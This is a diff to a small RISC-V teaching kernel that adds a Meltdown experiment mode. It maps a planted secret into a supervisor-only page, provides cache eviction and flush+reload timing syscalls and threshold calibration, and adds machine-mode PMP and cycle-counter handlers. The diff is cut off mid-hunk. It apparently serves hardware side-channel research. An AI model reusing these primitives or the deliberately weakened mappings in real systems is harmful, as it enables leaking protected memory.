@@ -1,15 +1,39 @@
 diff -ruN minios/Makefile minios/Makefile
 --- minios/Makefile	2026-07-08 16:57:35.212795000 +0800
-+++ minios/Makefile	2026-07-08 19:26:15.205185596 +0800
-@@ -48,6 +48,7 @@
++++ minios/Makefile	2026-07-09 00:40:49.561969512 +0800
+@@ -48,6 +48,31 @@
  PASS_SENTINEL ?= init: all tests passed
  SYSTEM_FUZZ ?= 0
  SYSTEM_FUZZ_COUNT ?= 32
 +MELTDOWN_US ?= 0
++MELTDOWN_US_PHYSMEM_MB ?= 8
++MELTDOWN_US_NPROC ?= 8
++MELTDOWN_US_NINODE ?= 32
++MELTDOWN_US_NFILE ?= 64
++MELTDOWN_US_TIMING ?= 0
++MELTDOWN_US_CYCLE_TIMING ?= 0
++MELTDOWN_US_ENABLE_COUNTEREN ?= $(MELTDOWN_US_CYCLE_TIMING)
++MELTDOWN_US_MCYCLE_TIMING ?= 0
++MELTDOWN_US_MMODE_CYCLE_TIMING ?= 0
++MELTDOWN_US_DEBUG_TIMES ?= 0
++MELTDOWN_US_DEBUG_ONLY ?= 0
++MELTDOWN_US_ATTEMPTS ?= 16
++MELTDOWN_US_TIME_REPS ?= 64
++MELTDOWN_US_CAL_REPS ?= 5
++MELTDOWN_US_PROBE_STRIDE ?= 64
++MELTDOWN_US_GADGET_DELAY ?= 0
++MELTDOWN_US_GADGET_VARIANT ?= 0
++MELTDOWN_US_TOUCH_SECRET_ON_ARM ?= 1
++MELTDOWN_US_TRAIN_USER_ACCESS ?= 0
++MELTDOWN_US_DEBUG_RESIDENCY ?= 0
++MELTDOWN_US_PRELOAD_ON_CLEAR ?= 0
++MELTDOWN_US_TRAIN_ALIAS ?= 0
++MELTDOWN_US_PMP_FAULT ?= 0
++BOOT_DEBUG ?= 1
  
  COMMON_SRCS := entry.S trampoline.S kernelvec.S main.c kprintf.c mem.c kalloc.c vm.c proc.c spinlock.c sleeplock.c swtch.S fs.c file.c pipe.c syscall.c trap.c
  SPIKE_SRCS  := $(COMMON_SRCS) platform_spike.c block_spike_htif.c
-@@ -79,8 +80,10 @@
+@@ -79,8 +104,10 @@
  USER_PROGS := init sh runall
  SYSFUZZ_PROGS := $(shell i=0; while [ $$i -lt $(SYSTEM_FUZZ_COUNT) ]; do printf 'sysfuzz_%03d ' $$i; i=$$((i+1)); done)
  USER_PROGS += $(SYSFUZZ_PROGS)
@@ -21,7 +45,7 @@ diff -ruN minios/Makefile minios/Makefile
  endif
  USER_BINS  := $(addprefix $(BUILD_DIR)/user/,$(USER_PROGS))
  USER_ASMS  := $(addsuffix .asm,$(USER_BINS))
-@@ -106,7 +109,11 @@
+@@ -106,7 +133,34 @@
  ifeq ($(SYSTEM_FUZZ),1)
  SYSTEM_FUZZ_CFLAGS += -DINIT_USER_TEST -DMINIOS_RUN_SYSFUZZ -DSYSFUZZ_COUNT=$(SYSTEM_FUZZ_COUNT)
  endif
@@ -29,14 +53,171 @@ diff -ruN minios/Makefile minios/Makefile
 +MELTDOWN_US_CFLAGS :=
 +ifeq ($(MELTDOWN_US),1)
 +MELTDOWN_US_CFLAGS += -DMINIOS_RUN_MELTDOWN_US
++MELTDOWN_US_CFLAGS += -DMINIOS_PHYSMEM_MB=$(MELTDOWN_US_PHYSMEM_MB)
++MELTDOWN_US_CFLAGS += -DNPROC=$(MELTDOWN_US_NPROC)
++MELTDOWN_US_CFLAGS += -DNINODE=$(MELTDOWN_US_NINODE)
++MELTDOWN_US_CFLAGS += -DNFILE=$(MELTDOWN_US_NFILE)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_TIMING=$(MELTDOWN_US_TIMING)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_CYCLE_TIMING=$(MELTDOWN_US_CYCLE_TIMING)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_ENABLE_COUNTEREN=$(MELTDOWN_US_ENABLE_COUNTEREN)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_MCYCLE_TIMING=$(MELTDOWN_US_MCYCLE_TIMING)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_MMODE_CYCLE_TIMING=$(MELTDOWN_US_MMODE_CYCLE_TIMING)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_DEBUG_TIMES=$(MELTDOWN_US_DEBUG_TIMES)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_DEBUG_ONLY=$(MELTDOWN_US_DEBUG_ONLY)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_ATTEMPTS=$(MELTDOWN_US_ATTEMPTS)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_TIME_REPS=$(MELTDOWN_US_TIME_REPS)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_CAL_REPS=$(MELTDOWN_US_CAL_REPS)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_PROBE_STRIDE=$(MELTDOWN_US_PROBE_STRIDE)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_GADGET_DELAY=$(MELTDOWN_US_GADGET_DELAY)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_GADGET_VARIANT=$(MELTDOWN_US_GADGET_VARIANT)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_TOUCH_SECRET_ON_ARM=$(MELTDOWN_US_TOUCH_SECRET_ON_ARM)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_TRAIN_USER_ACCESS=$(MELTDOWN_US_TRAIN_USER_ACCESS)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_DEBUG_RESIDENCY=$(MELTDOWN_US_DEBUG_RESIDENCY)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_PRELOAD_ON_CLEAR=$(MELTDOWN_US_PRELOAD_ON_CLEAR)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_TRAIN_ALIAS=$(MELTDOWN_US_TRAIN_ALIAS)
++MELTDOWN_US_CFLAGS += -DMELTDOWN_US_PMP_FAULT=$(MELTDOWN_US_PMP_FAULT)
 +endif
-+CFLAGS := $(BASE_CFLAGS) -DNCPU=$(CPUS) $(VM_MODE_CFLAG) $(SYSTEM_FUZZ_CFLAGS) $(MELTDOWN_US_CFLAGS)
++CFLAGS := $(BASE_CFLAGS) -DNCPU=$(CPUS) $(VM_MODE_CFLAG) -DBOOT_DEBUG=$(BOOT_DEBUG) $(SYSTEM_FUZZ_CFLAGS) $(MELTDOWN_US_CFLAGS)
  SPIKE_CFLAGS := $(CFLAGS) -DMINIOS_SPIKE_FS_IMAGE_PATH=\"$(SPIKE_FS_IMG)\"
  XIANGSHAN_CFLAGS := $(CFLAGS) -DMINIOS_PHYSMEM_MB=4 -DNPROC=4 -DNINODE=32 -DNFILE=64
  NEMU_CFLAGS := $(BASE_CFLAGS) -DNCPU=1 $(VM_MODE_CFLAG) $(SYSTEM_FUZZ_CFLAGS) -DMINIOS_PHYSMEM_MB=16 -DNPROC=128 -DNINODE=64 -DNFILE=256
+diff -ruN minios/entry.S minios/entry.S
+--- minios/entry.S	2026-07-08 16:57:35.210776000 +0800
++++ minios/entry.S	2026-07-09 00:53:04.861493335 +0800
+@@ -18,6 +18,10 @@
+     li t0, 0x800
+     csrs mstatus, t0
+     li t0, 0xffff
++#if MELTDOWN_US_MMODE_CYCLE_TIMING || MELTDOWN_US_PMP_FAULT
++    li t1, ~(1 << 9)
++    and t0, t0, t1
++#endif
+     csrw medeleg, t0
+     # Delegate supervisor/user interrupts, but keep machine timer interrupts
+     # in M-mode so timervec can re-arm mtimecmp and notify S-mode via SSIP.
+@@ -30,6 +34,10 @@
+     csrw pmpaddr0, t0
+     li t0, 0x0f
+     csrw pmpcfg0, t0
++#if MELTDOWN_US_ENABLE_COUNTEREN
++    li t0, 0x7
++    csrw mcounteren, t0
++#endif
+     mret
+ 
+ timerinit:
+@@ -74,19 +82,33 @@
+     sd t2, 32(t1)
+     csrw mscratch, t1
+ 
+-    la t0, timervec
++    la t0, machinevec
+     csrw mtvec, t0
+     li t0, (1 << 7)
+     csrs mie, t0
+     ret
+ 
+ .align 4
+-timervec:
++machinevec:
+     csrrw a0, mscratch, a0
+     sd a1, 0(a0)
+     sd a2, 8(a0)
+     sd a3, 16(a0)
++    csrr a1, mcause
++    li a2, 0x8000000000000007
++    beq a1, a2, timervec
++#if MELTDOWN_US_MMODE_CYCLE_TIMING
++    li a2, 9
++    beq a1, a2, mcycle_service
++#endif
++#if MELTDOWN_US_PMP_FAULT
++    li a2, 9
++    beq a1, a2, pmp_service
++#endif
++1:
++    j 1b
+ 
++timervec:
+     ld a1, 24(a0)
+     ld a2, 32(a0)
+     ld a3, 0(a1)
+@@ -102,6 +124,72 @@
+     csrrw a0, mscratch, a0
+     mret
+ 
++#if MELTDOWN_US_MMODE_CYCLE_TIMING
++mcycle_service:
++    li a1, 0x4d435943
++    bne a7, a1, mcycle_service_unknown
++    csrr a1, mcycle
++    csrr a2, mepc
++    addi a2, a2, 4
++    csrw mepc, a2
++    mv a2, a0
++    ld a3, 16(a2)
++    csrw mscratch, a2
++    mv a0, a1
++    ld a1, 0(a2)
++    ld a2, 8(a2)
++    mret
++mcycle_service_unknown:
++#if MELTDOWN_US_PMP_FAULT
++    j pmp_service
++#else
++    j 1b
++#endif
++#endif
++
++#if MELTDOWN_US_PMP_FAULT
++pmp_service:
++    li a1, 0x504d5046
++    bne a7, a1, 1f
++    beqz a6, pmp_clear_secret
++
++    srli a1, a6, 2
++    csrw pmpaddr0, a1
++    li a1, 4096
++    add a1, a6, a1
++    srli a1, a1, 2
++    csrw pmpaddr1, a1
++    li a1, -1
++    csrw pmpaddr2, a1
++    li a1, 0x0f080f
++    csrw pmpcfg0, a1
++    fence
++    j pmp_service_done
++
++pmp_clear_secret:
++    li a1, -1
++    csrw pmpaddr0, a1
++    csrw pmpaddr1, zero
++    csrw pmpaddr2, zero
++    li a1, 0x0f
++    csrw pmpcfg0, a1
++    fence
++
++pmp_service_done:
++    csrr a1, mepc
++    addi a1, a1, 4
++    csrw mepc, a1
++    mv a2, a0
++    ld a3, 16(a2)
++    csrw mscratch, a2
++    li a0, 0
++    ld a1, 0(a2)
++    ld a2, 8(a2)
++    mret
++1:
++    j 1b
++#endif
++
+ supervisor_entry:
+     call main
+ 1:
 diff -ruN minios/inc/proc.h minios/inc/proc.h
 --- minios/inc/proc.h	2026-07-08 16:58:25.483722000 +0800
-+++ minios/inc/proc.h	2026-07-08 19:26:16.233189125 +0800
++++ minios/inc/proc.h	2026-07-08 19:42:42.295386483 +0800
 @@ -125,6 +125,7 @@
      struct file* proc_ftab[NOFILE];
      struct vma vmas[NVMA];
@@ -47,28 +228,77 @@ diff -ruN minios/inc/proc.h minios/inc/proc.h
  
 diff -ruN minios/inc/syscall.h minios/inc/syscall.h
 --- minios/inc/syscall.h	2026-07-08 16:58:30.598843000 +0800
-+++ minios/inc/syscall.h	2026-07-08 19:26:15.735187415 +0800
-@@ -26,6 +26,8 @@
++++ minios/inc/syscall.h	2026-07-09 00:41:26.646096799 +0800
+@@ -26,6 +26,17 @@
  #define SYS_mremap 32
  #define SYS_mkdir 33
  #define SYS_getprocinfo 450
 +#define SYS_meltdown_setup 451
 +#define SYS_meltdown_arm 452
++#define SYS_meltdown_done 453
++#define SYS_meltdown_probe 454
++#define SYS_meltdown_calibrate 455
++#define SYS_meltdown_flush_probe 456
++#define SYS_meltdown_probe_time_one 457
++#define SYS_meltdown_set_secret_user 458
++#define SYS_meltdown_residency 459
++#define SYS_meltdown_alias 460
++#define SYS_meltdown_pmp_secret 461
  
  #ifndef __ASSEMBLER__
  #include "type.h"
+diff -ruN minios/main.c minios/main.c
+--- minios/main.c	2026-07-08 16:57:35.212601000 +0800
++++ minios/main.c	2026-07-08 19:53:11.067731851 +0800
+@@ -24,7 +24,9 @@
+ #define MINIOS_VM_MODE "unknown"
+ #endif
+ 
+-#define BOOT_DEBUG
++#ifndef BOOT_DEBUG
++#define BOOT_DEBUG 1
++#endif
+ 
+ // static void halt(int code) {
+ //     if (code == 0) {
+@@ -51,11 +53,13 @@
+ // }
+ 
+ static void boot_stage(uint64 hartid, const char* msg) {
+-    #ifdef BOOT_DEBUG
++    #if BOOT_DEBUG
+     if (hartid == 0) {
+         kprintf_unlocked("[boot] %s\n", msg);
+     }
+     #else
++    (void)hartid;
++    (void)msg;
+     return;
+     #endif
+ }
 diff -ruN minios/proc.c minios/proc.c
 --- minios/proc.c	2026-07-08 16:57:35.214762000 +0800
-+++ minios/proc.c	2026-07-08 19:27:35.993462893 +0800
-@@ -19,6 +19,7 @@
++++ minios/proc.c	2026-07-09 00:29:34.779653402 +0800
+@@ -19,6 +19,8 @@
  #define MAP_ANONYMOUS 0x20
  #define MREMAP_MAYMOVE 1
  #define MMAP_BASE (1UL << 30)
 +#define MELTDOWN_SECRET_VA (1UL << 29)
++#define MELTDOWN_SECRET_ALIAS_VA (MELTDOWN_SECRET_VA + PGSIZE)
  
  struct cpu cpus[NCPU];
  struct proc proc[NPROC];
-@@ -132,6 +133,7 @@
+@@ -94,7 +96,9 @@
+     spinlock_init(&wait_lock, "wait lock - protect waiting parents are not lost");
+     fileinit();
+     for (p = proc; p < &proc[NPROC]; p++) {
++        #if BOOT_DEBUG
+         kprintf("handling proc %p\n", p);
++        #endif
+         spinlock_init(&p->proc_lock, "process control block lock");
+         p->state = PCB_UNUSED;
+         p->kstack = KSTACK((int)(p - proc));
+@@ -132,6 +136,7 @@
      memset(p->proc_ftab, 0, sizeof(p->proc_ftab));
      memset(p->vmas, 0, sizeof(p->vmas));
      p->cwd = NULL;
@@ -76,13 +306,14 @@ diff -ruN minios/proc.c minios/proc.c
  
      if ((p->tf = (struct trapframe*)kalloc()) == NULL) {
          freeproc(p); spinlock_release(&p->proc_lock); return 0;
-@@ -166,9 +168,14 @@
+@@ -166,9 +171,15 @@
      mmap_unmap_all(p);
      proc_dropcwd(p);
      if (p->tf) { kfree((void*)p->tf); } p->tf = NULL;
 -    if (p->pt) { proc_freepagetable(p->pt, p->vm_size, p->stack_base, p->stack_top); } p->pt = NULL;
 +    if (p->pt) {
 +        uvmunmap(p->pt, MELTDOWN_SECRET_VA, 1, 0);
++        uvmunmap(p->pt, MELTDOWN_SECRET_ALIAS_VA, 1, 0);
 +        proc_freepagetable(p->pt, p->vm_size, p->stack_base, p->stack_top);
 +    }
 +    p->pt = NULL;
@@ -94,25 +325,71 @@ diff -ruN minios/proc.c minios/proc.c
      p->sleep_on_chan = NULL; p->killed = 0; p->exit_state = 0; p->state = PCB_UNUSED;
 diff -ruN minios/syscall.c minios/syscall.c
 --- minios/syscall.c	2026-07-08 16:57:35.215469000 +0800
-+++ minios/syscall.c	2026-07-08 19:26:18.788197894 +0800
-@@ -13,6 +13,10 @@
++++ minios/syscall.c	2026-07-09 00:42:09.939245397 +0800
+@@ -9,10 +9,51 @@
+ #include "inc/riscv.h"
+ #include "inc/type.h"
+ #include "inc/vm.h"
++#include "inc/platform.h"
+ 
  #define MAXPATH 128
  #define MAXARG 16
  #define MAX_DIRENTS 64
 +#define MELTDOWN_SECRET_VA (1UL << 29)
++#define MELTDOWN_SECRET_ALIAS_VA (MELTDOWN_SECRET_VA + PGSIZE)
 +#define MELTDOWN_SECRET_VALUE 0x53
++#define MELTDOWN_PROBE_VALUES 256
++#ifndef MELTDOWN_US_PROBE_STRIDE
++#define MELTDOWN_US_PROBE_STRIDE 64
++#endif
++#define MELTDOWN_PROBE_STRIDE MELTDOWN_US_PROBE_STRIDE
++#define MELTDOWN_PROBE_BYTES (MELTDOWN_PROBE_VALUES * MELTDOWN_PROBE_STRIDE)
++#define MELTDOWN_L1_SETS 64
++#define MELTDOWN_L1_WAYS 4
++#define MELTDOWN_L1_SET_SPAN_BYTES (MELTDOWN_L1_SETS * MELTDOWN_PROBE_STRIDE)
++#define MELTDOWN_EVICTION_MULTIPLIER 4
++#define MELTDOWN_EVICTION_BYTES (5 * MELTDOWN_L1_SETS * MELTDOWN_L1_WAYS * MELTDOWN_PROBE_STRIDE)
++#ifndef MELTDOWN_US_TIME_REPS
++#define MELTDOWN_US_TIME_REPS 64
++#endif
++#ifndef MELTDOWN_US_CYCLE_TIMING
++#define MELTDOWN_US_CYCLE_TIMING 0
++#endif
++#ifndef MELTDOWN_US_MCYCLE_TIMING
++#define MELTDOWN_US_MCYCLE_TIMING 0
++#endif
++#ifndef MELTDOWN_US_MMODE_CYCLE_TIMING
++#define MELTDOWN_US_MMODE_CYCLE_TIMING 0
++#endif
++#ifndef MELTDOWN_US_CAL_REPS
++#define MELTDOWN_US_CAL_REPS 5
++#endif
++#ifndef MELTDOWN_US_TOUCH_SECRET_ON_ARM
++#define MELTDOWN_US_TOUCH_SECRET_ON_ARM 1
++#endif
++#ifndef MELTDOWN_US_PMP_FAULT
++#define MELTDOWN_US_PMP_FAULT 0
++#endif
 +
 +static uchar meltdown_secret_page[PGSIZE] __attribute__((aligned(PGSIZE)));
++static uchar meltdown_eviction[MELTDOWN_EVICTION_BYTES + MELTDOWN_L1_SET_SPAN_BYTES]
++    __attribute__((aligned(MELTDOWN_L1_SET_SPAN_BYTES)));
++static volatile uchar meltdown_sink;
  
  static uint64 argraw(int n) {
      struct proc* p = myproc();
-@@ -430,6 +434,40 @@
+@@ -430,6 +471,346 @@
      return 0;
  }
  
 +static uint64 sys_meltdown_setup(void) {
 +    struct proc* p = myproc();
 +    pte_t* pte;
++    pte_t* alias_pte;
++    uint64 secret_perm = RISCV_PTE_R;
++#if MELTDOWN_US_PMP_FAULT
++    secret_perm = RISCV_PTE_R | RISCV_PTE_U;
++#endif
 +
 +    memset(meltdown_secret_page, 0, sizeof(meltdown_secret_page));
 +    meltdown_secret_page[0] = MELTDOWN_SECRET_VALUE;
@@ -120,18 +397,73 @@ diff -ruN minios/syscall.c minios/syscall.c
 +    pte = walk(p->pt, MELTDOWN_SECRET_VA, 0);
 +    if (pte != NULL && (*pte & RISCV_PTE_V) != 0) {
 +        if (PTE2PA(*pte) == (uint64)meltdown_secret_page &&
-+            ((*pte & RISCV_PTE_U) == 0)) {
++            ((*pte & (RISCV_PTE_R | RISCV_PTE_U)) == secret_perm)) {
++            alias_pte = walk(p->pt, MELTDOWN_SECRET_ALIAS_VA, 0);
++            if (alias_pte == NULL || (*alias_pte & RISCV_PTE_V) == 0) {
++                if (mappages(p->pt, MELTDOWN_SECRET_ALIAS_VA, PGSIZE,
++                             (uint64)meltdown_secret_page,
++                             RISCV_PTE_R | RISCV_PTE_U) != 0) {
++                    return (uint64)-1;
++                }
++            } else if (PTE2PA(*alias_pte) != (uint64)meltdown_secret_page ||
++                       ((*alias_pte & RISCV_PTE_U) == 0)) {
++                return (uint64)-1;
++            }
++            sfence_vma();
 +            return MELTDOWN_SECRET_VA;
 +        }
 +        return (uint64)-1;
 +    }
 +
 +    if (mappages(p->pt, MELTDOWN_SECRET_VA, PGSIZE, (uint64)meltdown_secret_page,
-+                 RISCV_PTE_R) != 0) {
++                 secret_perm) != 0) {
++        return (uint64)-1;
++    }
++    if (mappages(p->pt, MELTDOWN_SECRET_ALIAS_VA, PGSIZE,
++                 (uint64)meltdown_secret_page, RISCV_PTE_R | RISCV_PTE_U) != 0) {
++        uvmunmap(p->pt, MELTDOWN_SECRET_VA, 1, 0);
 +        return (uint64)-1;
 +    }
 +    sfence_vma();
 +    return MELTDOWN_SECRET_VA;
++}
++
++static uint64 sys_meltdown_alias(void) {
++    return MELTDOWN_SECRET_ALIAS_VA;
++}
++
++static inline uint64 mmode_pmp_secret(uint64 secret_pa) {
++#if MELTDOWN_US_PMP_FAULT
++    register uint64 a0 asm("a0");
++    register uint64 a6 asm("a6") = secret_pa;
++    register uint64 a7 asm("a7") = 0x504d5046UL;
++
++    asm volatile("ecall" : "=r"(a0) : "r"(a6), "r"(a7) : "memory");
++    return a0;
++#else
++    (void)secret_pa;
++    return (uint64)-1;
++#endif
++}
++
++static uint64 sys_meltdown_pmp_secret(void) {
++    int deny;
++
++    if (argint(0, &deny) < 0) {
++        return (uint64)-1;
++    }
++#if MELTDOWN_US_PMP_FAULT
++    if (deny) {
++        return mmode_pmp_secret((uint64)meltdown_secret_page);
++    }
++    return mmode_pmp_secret(0);
++#else
++    return (uint64)-1;
++#endif
++}
++
++static inline void meltdown_fence_all(void) {
++    asm volatile("fence rw, rw" ::: "memory");
 +}
 +
 +static uint64 sys_meltdown_arm(void) {
@@ -141,29 +473,302 @@ diff -ruN minios/syscall.c minios/syscall.c
 +        return (uint64)-1;
 +    }
 +    myproc()->meltdown_recover_epc = recover_pc;
++#if MELTDOWN_US_TOUCH_SECRET_ON_ARM
++    meltdown_sink = meltdown_sink ^ *(volatile uchar*)meltdown_secret_page;
++    meltdown_fence_all();
++#endif
 +    return 0;
++}
++
++static uint64 sys_meltdown_done(void) {
++    int code;
++
++    if (argint(0, &code) < 0) {
++        return (uint64)-1;
++    }
++    platform_halt(code);
++    return 0;
++}
++
++static uint64 sys_meltdown_set_secret_user(void) {
++    struct proc* p = myproc();
++    int user;
++    pte_t* pte;
++
++    if (argint(0, &user) < 0) {
++        return (uint64)-1;
++    }
++
++    pte = walk(p->pt, MELTDOWN_SECRET_VA, 0);
++    if (pte == NULL || (*pte & RISCV_PTE_V) == 0 ||
++        PTE2PA(*pte) != (uint64)meltdown_secret_page) {
++        return (uint64)-1;
++    }
++
++    if (user == 1) {
++        *pte = *pte | RISCV_PTE_U;
++    } else {
++        *pte = *pte & ~RISCV_PTE_U;
++    }
++    sfence_vma();
++    if (user == 2) {
++        meltdown_sink = meltdown_sink ^ *(volatile uchar*)meltdown_secret_page;
++        meltdown_fence_all();
++    }
++    return 0;
++}
++
++static inline uint64 mmode_mcycle(void) {
++    register uint64 a0 asm("a0");
++    register uint64 a7 asm("a7") = 0x4d435943UL;
++
++    asm volatile("ecall" : "=r"(a0) : "r"(a7) : "memory");
++    return a0;
++}
++
++static inline uint64 meltdown_cycle(void) {
++#if MELTDOWN_US_MMODE_CYCLE_TIMING
++    return mmode_mcycle();
++#elif MELTDOWN_US_MCYCLE_TIMING
++    return r_mcycle();
++#elif MELTDOWN_US_CYCLE_TIMING
++    return r_cycle();
++#else
++    #if defined(PLATFORM_XIANGSHAN) || defined(PLATFORM_NEMU)
++    volatile uint64* mtime = (volatile uint64*)0x3800bff8UL;
++    #else
++    volatile uint64* mtime = (volatile uint64*)0x0200bff8UL;
++    #endif
++    return *mtime;
++#endif
++}
++
++static uint64 meltdown_probe_pa(struct proc* p, uint64 probe_va, int index) {
++    uint64 va = probe_va + (uint64)index * MELTDOWN_PROBE_STRIDE;
++    uint64 pa = walkaddr(p->pt, va);
++
++    if (pa == 0) {
++        return 0;
++    }
++    return pa + (va & (PGSIZE - 1));
++}
++
++static uint64 meltdown_eviction_base(void) {
++    return ((uint64)meltdown_eviction + (MELTDOWN_L1_SET_SPAN_BYTES - 1)) &
++           ~(uint64)(MELTDOWN_L1_SET_SPAN_BYTES - 1);
++}
++
++static void meltdown_flush_line(uint64 addr) {
++    uint64 set = (addr >> 6) & (MELTDOWN_L1_SETS - 1);
++    uint64 base = meltdown_eviction_base();
++
++    for (uint64 way = 0; way < MELTDOWN_EVICTION_MULTIPLIER * MELTDOWN_L1_WAYS; way = way + 1) {
++        uint64 p = base + (set << 6) + (way * MELTDOWN_L1_SET_SPAN_BYTES);
++        meltdown_sink = meltdown_sink ^ *(volatile uchar*)p;
++    }
++    meltdown_fence_all();
++}
++
++static uint64 meltdown_probe_time(uint64 addr) {
++    volatile uchar* p = (volatile uchar*)addr;
++    meltdown_fence_all();
++    uint64 start = meltdown_cycle();
++    uchar value = 0;
++    for (int rep = 0; rep < MELTDOWN_US_TIME_REPS; rep = rep + 1) {
++        value = value ^ *p;
++    }
++    meltdown_fence_all();
++    meltdown_sink = meltdown_sink ^ value;
++    return meltdown_cycle() - start;
++}
++
++static int meltdown_probe_mix(int i) {
++    return ((i * 167) + 13) & 255;
++}
++
++static uint64 sys_meltdown_calibrate(void) {
++    struct proc* p = myproc();
++    uint64 probe_va;
++    uint64 hot_pa;
++    uint64 cold_pa;
++    uint64 hit = ~(uint64)0;
++    uint64 miss = 0;
++
++    if (argaddr(0, &probe_va) < 0) {
++        return 0;
++    }
++
++    hot_pa = meltdown_probe_pa(p, probe_va, 0);
++    cold_pa = meltdown_probe_pa(p, probe_va, 1);
++    if (hot_pa == 0 || cold_pa == 0) {
++        return 0;
++    }
++
++    for (int rep = 0; rep < MELTDOWN_US_CAL_REPS; rep = rep + 1) {
++        uint64 sample_hit;
++        uint64 sample_miss;
++
++        meltdown_sink = meltdown_sink ^ *(volatile uchar*)hot_pa;
++        sample_hit = meltdown_probe_time(hot_pa);
++        if (sample_hit < hit) {
++            hit = sample_hit;
++        }
++
++        meltdown_flush_line(cold_pa);
++        sample_miss = meltdown_probe_time(cold_pa);
++        if (sample_miss > miss) {
++            miss = sample_miss;
++        }
++    }
++    return ((hit & 0xffffffffUL) << 32) | (miss & 0xffffffffUL);
++}
++
++static uint64 sys_meltdown_flush_probe(void) {
++    struct proc* p = myproc();
++    uint64 probe_va;
++
++    if (argaddr(0, &probe_va) < 0) {
++        return (uint64)-1;
++    }
++
++    for (int i = 0; i < MELTDOWN_PROBE_VALUES; i = i + 1) {
++        uint64 pa = meltdown_probe_pa(p, probe_va, i);
++        if (pa == 0) {
++            return (uint64)-1;
++        }
++        meltdown_flush_line(pa);
++    }
++    return 0;
++}
++
++static uint64 sys_meltdown_probe(void) {
++    struct proc* p = myproc();
++    uint64 probe_va;
++    uint64 threshold;
++    uint64 hits_va;
++    uint32 hits[MELTDOWN_PROBE_VALUES];
++
++    if (argaddr(0, &probe_va) < 0 || argaddr(1, &threshold) < 0 ||
++        argaddr(2, &hits_va) < 0) {
++        return (uint64)-1;
++    }
++
++    memset(hits, 0, sizeof(hits));
++    for (int i = 0; i < MELTDOWN_PROBE_VALUES; i = i + 1) {
++        int mixed = meltdown_probe_mix(i);
++        uint64 pa = meltdown_probe_pa(p, probe_va, mixed);
++        uint64 elapsed;
++
++        if (pa == 0) {
++            return (uint64)-1;
++        }
++        elapsed = meltdown_probe_time(pa);
++        if (elapsed <= threshold) {
++            hits[mixed] = hits[mixed] + 1;
++        }
++    }
++
++    if (copyout(p->pt, hits_va, (char*)hits, sizeof(hits)) < 0) {
++        return (uint64)-1;
++    }
++    return 0;
++}
++
++static uint64 sys_meltdown_probe_time_one(void) {
++    struct proc* p = myproc();
++    uint64 probe_va;
++    int index;
++    uint64 pa;
++
++    if (argaddr(0, &probe_va) < 0 || argint(1, &index) < 0) {
++        return (uint64)-1;
++    }
++    if (index < 0 || index >= MELTDOWN_PROBE_VALUES) {
++        return (uint64)-1;
++    }
++
++    pa = meltdown_probe_pa(p, probe_va, index);
++    if (pa == 0) {
++        return (uint64)-1;
++    }
++    return meltdown_probe_time(pa);
++}
++
++static uint64 sys_meltdown_residency(void) {
++    struct proc* p = myproc();
++    uint64 probe_va;
++    uint64 probe53_pa;
++    uint64 probe0_pa;
++    uint64 secret_time;
++    uint64 probe53_time;
++    uint64 probe0_time;
++
++    if (argaddr(0, &probe_va) < 0) {
++        return (uint64)-1;
++    }
++
++    probe53_pa = meltdown_probe_pa(p, probe_va, 0x53);
++    probe0_pa = meltdown_probe_pa(p, probe_va, 0);
++    if (probe53_pa == 0 || probe0_pa == 0) {
++        return (uint64)-1;
++    }
++
++    secret_time = meltdown_probe_time((uint64)meltdown_secret_page);
++    probe53_time = meltdown_probe_time(probe53_pa);
++    probe0_time = meltdown_probe_time(probe0_pa);
++
++    return ((secret_time & 0xffffUL) << 32) |
++           ((probe53_time & 0xffffUL) << 16) |
++           (probe0_time & 0xffffUL);
 +}
 +
  static uint64 sys_mmap(void) {
      uint64 addr;
      uint64 length;
-@@ -512,6 +550,8 @@
+@@ -512,6 +893,17 @@
      [SYS_mremap] sys_mremap,
      [SYS_mkdir] sys_mkdir,
      [SYS_getprocinfo] sys_getprocinfo,
 +    [SYS_meltdown_setup] sys_meltdown_setup,
 +    [SYS_meltdown_arm] sys_meltdown_arm,
++    [SYS_meltdown_done] sys_meltdown_done,
++    [SYS_meltdown_probe] sys_meltdown_probe,
++    [SYS_meltdown_calibrate] sys_meltdown_calibrate,
++    [SYS_meltdown_flush_probe] sys_meltdown_flush_probe,
++    [SYS_meltdown_probe_time_one] sys_meltdown_probe_time_one,
++    [SYS_meltdown_set_secret_user] sys_meltdown_set_secret_user,
++    [SYS_meltdown_residency] sys_meltdown_residency,
++    [SYS_meltdown_alias] sys_meltdown_alias,
++    [SYS_meltdown_pmp_secret] sys_meltdown_pmp_secret,
  };
  
  void syscall(void) {
 diff -ruN minios/trap.c minios/trap.c
 --- minios/trap.c	2026-07-08 16:57:35.277986000 +0800
-+++ minios/trap.c	2026-07-08 19:32:53.728553482 +0800
-@@ -84,6 +84,9 @@
++++ minios/trap.c	2026-07-09 00:42:19.246277342 +0800
+@@ -12,6 +12,7 @@
+ #define SCAUSE_INST_PAGE_FAULT 12
+ #define SCAUSE_LOAD_PAGE_FAULT 13
+ #define SCAUSE_STORE_PAGE_FAULT 15
++#define SCAUSE_LOAD_ACCESS_FAULT 5
+ 
+ extern char trampoline[];
+ extern char uservec[];
+@@ -61,6 +62,8 @@
+         panic("[trap] unexpected kernel ecall");
+     }
+ 
++    kprintf("[trap] unexpected kernel trap scause=0x%lx sepc=0x%lx stval=0x%lx\n",
++            scause, sepc, r_stval());
+     panic("[trap] unexpected kernel trap");
+ }
+ 
+@@ -84,6 +87,10 @@
          syscall();
      } else if (handle_interrupt(scause)) {
          yield();
-+    } else if (scause == SCAUSE_LOAD_PAGE_FAULT && p->meltdown_recover_epc != 0) {
